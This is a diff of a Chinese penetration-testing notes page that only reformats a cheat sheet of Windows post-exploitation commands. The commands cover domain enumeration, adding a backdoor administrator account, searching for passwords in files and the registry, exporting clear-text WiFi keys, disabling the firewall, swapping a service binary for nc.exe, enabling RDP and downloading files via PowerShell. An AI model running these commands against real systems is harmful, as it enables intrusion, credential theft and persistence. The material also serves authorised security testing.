@@ -7,179 +7,99 @@ Created Sunday 03 December 2017
 
 在渗透测试中遇到 Windows 的概率是非常大的，那么在拿到一台服务器权限之后，通常会获得一个 shell，想要进行下一步渗透，几乎都是需要通过在 shell 中使用 Windows 的命令来进行渗透的，下面是一些常用的命令，虽然以前都发过了，但是很多人是不怎么反旧文的，所以每发出一次都会有人或多或少能学点东西，我就再发发，多看一遍多加深一点印象，凑合着看吧，最近实在是时间不多，压力大呀！
 
-net 的常用用法
-查看共享连接
+__net 的常用用法__
 
-net use
+查看共享连接		net use	
 
-增加远程共享
+增加远程共享		net use \host /u:user passwd
 
-net use \host /u:user passwd
+查看域中当前的主机列表	net view /domain
 
-查看域中当前的主机列表
+查看当前域中的用户	net user /domain
 
-net view /domain
+增加一个本地用户		net user user pass /add
 
-查看当前域中的用户
+将新增的用户加到本地管理员组	net localgroup "Administrators" user /add
 
-net user /domain
+查看域中的密码策略	net accounts /domain
 
-增加一个本地用户
+查看本地组		net localgroup "Group"
 
-net user user pass /add
+查看域中的组信息		net group /domain
 
-将新增的用户加到本地管理员组
+查看域中指定组的成员	net group "Domain group" /domain
 
-net localgroup "Administrators" user /add
+查看当前机器所在的域名	net config workstation
 
-查看域中的密码策略
+查看当前服务器所在的域名	net config server
 
-net accounts /domain
+__系统信息相关命令__
 
-查看本地组
+显示系统信息		systeminfo
 
-net localgroup "Group"
+查看远程主机的系统信息	systeminfo /S ip /U domain\user /P Pwd
 
-查看域中的组信息
+显示进程和服务信息	tasklist /svc
 
-net group /domain
+显示所有进程以及DLL信息	tasklist /m
 
-查看域中指定组的成员
+显示进程和所有者		tasklist /v
 
-net group "Domain group" /domain
+查看远程主机的进程列表	tasklist /S ip /v
 
-查看当前机器所在的域名
+搜索所有 pdf 文件	dir /a /s /b c:\'.pdf'
 
-net config workstation
+显示服务信息		sc query	
 
-查看当前服务器所在的域名
+显示具体的服务信息（包括二进制路径和运行使用）	sc qc Spooler
 
-net config server
+找出文件名字包含 password 的文件			findstr /si 'password' .txt  
 
-系统信息相关命令
-显示系统信息
+搜索敏感文件名称		dir /s *pass* == *cred* == *vnc* == *.config* 
 
-systeminfo
+更改服务的二进制路径	sc config upnphost binpath= "C:\nc.exe"
 
-查看远程主机的系统信息
+修改系统服务的权限	sc config upnphost obj= ".\LocalSystem" password= ""
 
-systeminfo /S ip /U domain\user /P Pwd
+检查系统服务的权限	accesschk.exe -ucqv "Authenticated Users" * /accepteula
 
-显示进程和服务信息
+检查指定服务的权限	accesschk.exe -ucqv ServceName /accepteula
 
-tasklist /svc
+检查指定组在指定目录下的写权限	accesschk.exe -uwdqs "Authenticated Users" c:\ /accepteula
 
-显示所有进程以及DLL信息
+__网络信息__
 
-tasklist /m
+打印路由表		route print
 
-显示进程和所有者
+保存当前主机上的所有WiFi信息	netsh wlan export profile folder=. key=clear
 
-tasklist /v
+设置当前配置禁用防火墙	netsh advfirewall set currentprofile state off
 
-查看远程主机的进程列表
+设置端口转发		netsh interface portproxy add v4tov4 listenport=3000 listenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2
 
-tasklist /S ip /v
+__开启远程访问__
+启用远程访问		reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
-搜索所有 pdf 文件
+启用远程协助		reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
 
-dir /a /s /b c:\'.pdf'
+修改远程访问端口		reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 12345 /f
 
-显示服务信息
+__注册表操作__
+查找注册表中的密码	reg query HKLM /f password /t REG_SZ /s
 
-sc query	
+查询 winlogon 信息	reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
 
-显示具体的服务信息（包括二进制路径和运行使用）
+__使用 powershell__
+下载文件		powershell -c "(new-object System.Net.WebClient).DownloadFile('http://blabla.com/test.txt','C:\Users\admin\Desktop\test.test')"
 
-sc qc Spooler
+列出运行的服务		Get-Service I where object {$ .status -eq ''Running''}
 
-找出文件名字包含 password 的文件
+__编译 C# 代码__
+1、切换到 .NET 目录	cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319 (或者 .NET 的对应版本的目录)
 
-findstr /si 'password' .txt  
-
-搜索敏感文件名称
-
-dir /s *pass* == *cred* == *vnc* == *.config* 
-
-更改服务的二进制路径
-
-sc config upnphost binpath= "C:\nc.exe"
-
-修改系统服务的权限
-
-sc config upnphost obj= ".\LocalSystem" password= ""
-
-检查系统服务的权限
-
-accesschk.exe -ucqv "Authenticated Users" * /accepteula
-
-检查指定服务的权限
-
-accesschk.exe -ucqv ServceName /accepteula
-
-检查指定组在指定目录下的写权限
-
-accesschk.exe -uwdqs "Authenticated Users" c:\ /accepteula
-
-网络信息
-打印路由表
-
-route print
-
-保存当前主机上的所有WiFi信息
-
-netsh wlan export profile folder=. key=clear
-
-设置当前配置禁用防火墙
-
-netsh advfirewall set currentprofile state off
-
-设置端口转发
-
-netsh interface portproxy add v4tov4 listenport=3000 listenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2
-
-开启远程访问
-启用远程访问
-
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-
-启用远程协助
-
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
-
-修改远程访问端口
-
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 12345 /f
-
-注册表操作
-查找注册表中的密码
-
-reg query HKLM /f password /t REG_SZ /s
-
-查询 winlogon 信息
-
-reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
-
-使用 powershell
-下载文件
-
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://blabla.com/test.txt','C:\Users\admin\Desktop\test.test')"
-
-列出运行的服务
-
-Get-Service I where object {$ .status -eq ''Running''}
-
-编译 C# 代码
-1、切换到 .NET 目录
-
-cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319 (或者 .NET 的对应版本的目录)
-
-2、编译 x86 版本
-
-csc.exe /unsafe /reference:"C:\path\to\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:<out_file_name> /platform:x86 "/cs/files/dir/*.cs"
+2、编译 x86 版本	csc.exe /unsafe /reference:"C:\path\to\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:<out_file_name> /platform:x86 "/cs/files/dir/*.cs"
 
 3、编译 x64 版本
 
 csc.exe /unsafe /reference:"C:\path\to\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:<out_file_name> /platform:x64 "/cs/files/dir/*.cs"
 
-总结
